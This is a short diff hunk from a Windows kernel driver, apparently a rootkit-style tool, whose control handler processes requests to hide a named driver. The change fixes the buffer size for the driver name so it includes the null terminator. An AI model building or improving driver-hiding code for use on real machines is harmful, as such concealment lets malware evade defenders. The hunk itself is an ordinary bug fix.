@@ -825,7 +825,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (HiddenDriverInformation*)Irp->AssociatedIrp.SystemBuffer;
 		hiddenDriver.Hide = data->Hide;
-		SIZE_T driverNameSize = wcslen(data->DriverName) * sizeof(WCHAR);
+		SIZE_T driverNameSize = (wcslen(data->DriverName) + 1) * sizeof(WCHAR);
 		MemoryAllocator<WCHAR*> driverNameAllocator(&hiddenDriver.DriverName, driverNameSize, PagedPool);
 		status = driverNameAllocator.CopyData(data->DriverName, driverNameSize);
 
